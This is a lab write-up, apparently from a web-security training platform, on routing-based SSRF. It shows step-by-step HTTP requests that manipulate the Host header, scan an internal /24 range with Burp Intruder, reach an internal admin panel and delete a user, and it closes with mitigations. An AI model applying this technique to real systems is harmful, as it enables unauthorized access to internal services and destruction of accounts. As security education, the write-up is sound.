# Routing-based SSRF

## Vulnerability Definition


**Routing-based SSRF (Server-Side Request Forgery)** occurs when an attacker can manipulate a request-routing value, such as the `Host` 


header, causing the server or its middleware to route requests to an unintended internal or external destination.



In this lab, the `Host` header could be manipulated to route requests to internal IP addresses in the `192.168.0.0/24` range.



The goal was to access the internal admin panel and delete the user `carlos`.



---


## Core Concept

The application used the `Host` header to determine where the request should be routed.



Instead of:




```http

Host: vulnerable-lab.net

```



we could attempt to route the request to an internal IP:



```http

Host: 192.168.0.X

```



Because the correct internal IP was unknown, we performed IP discovery across the `192.168.0.0/24` range.



---



## Exploitation



### 1. Identify the SSRF behavior



A request was sent with an internal IP in the `Host` header:


```http


GET / HTTP/2

Host: 192.168.0.43

```


Requests to non-responsive internal hosts returned:




```http

HTTP/2 504 Gateway Timeout

```




This indicated that the application's middleware was attempting to connect to the supplied host.



---


### 2. Discover the Internal IP





The request was sent to Burp Intruder.


The `Host` header was configured as:






```http

Host: 192.168.0.§0§

```

The option:

```text

Update Host header to match target

```



was disabled.




Payload type:




```text

Numbers


```



Payload configuration:


```text

From: 0

To: 255


Step: 1

```


This tested all IP addresses in:





```text


192.168.0.0/24



```



---



### 3. Identify the Correct Host



Most requests returned:




```http

504 Gateway Timeout

```



However, one request returned:



```http

HTTP/2 302 Found

Location: /admin

```


The corresponding IP address was:



```text

192.168.0.43

```



The redirect to `/admin` indicated that this internal host contained the administrative interface.



---



### 4. Access the Internal Admin Panel


The request was modified to:




```http

GET /admin HTTP/2

Host: 192.168.0.43

Cookie: session=...

```



The server returned:



```http

HTTP/2 200 OK

```



The response contained an administrative form:



```html

<form action='/admin/delete' method='POST'>

```



---



### 5. Extract the CSRF Token


The admin page contained a hidden CSRF token:




```html

<input type="hidden"

name="csrf"


value="CSRF_TOKEN">

```




The token from the response was required for the delete operation.



---


### 6. Craft the Delete Request




The request was initially created as:



```http

GET /admin/delete?csrf=CSRF_TOKEN&username=carlos HTTP/2

Host: 192.168.0.43

Cookie: session=...

```






Burp's **Change request method** feature was then used to convert it to:


```http

POST /admin/delete?csrf=CSRF_TOKEN&username=carlos HTTP/2

```



---


### 7. Delete the User


The request was sent with:



```text

username=carlos

```



along with the valid session and CSRF token.



The user `carlos` was successfully deleted and the lab was solved.



---



## Attack Flow



```text

Manipulate Host header

        ↓

Routing-based SSRF

        ↓


Scan 192.168.0.0/24

        ↓

Find 192.168.0.43

        ↓

GET /admin

        ↓

Extract CSRF token
        ↓

POST /admin/delete


        ↓
username=carlos

        ↓


Lab solved

```


## Key Takeaways





- The `Host` header can influence server-side routing in vulnerable applications.

- Routing behavior can sometimes be abused to reach internal services.

- A `504 Gateway Timeout` can indicate that the server attempted to connect to an internal destination but received no response.

- A redirect such as `302 → /admin` can reveal a valid internal host.

- Internal administrative endpoints may still require normal security controls such as authentication, sessions, and CSRF tokens.

- The final exploit relied on routing the request to the internal admin server and then performing the legitimate delete operation through 
that interface.


## Mitigation



- Do not use user-controlled `Host` headers directly to determine upstream destinations.

- Use strict allowlists for trusted hosts and routing destinations.

- Restrict application-server access to internal networks.


- Keep administrative interfaces isolated from public-facing applications.

- Validate and sanitize routing-related headers such as `Host` and `X-Forwarded-Host`.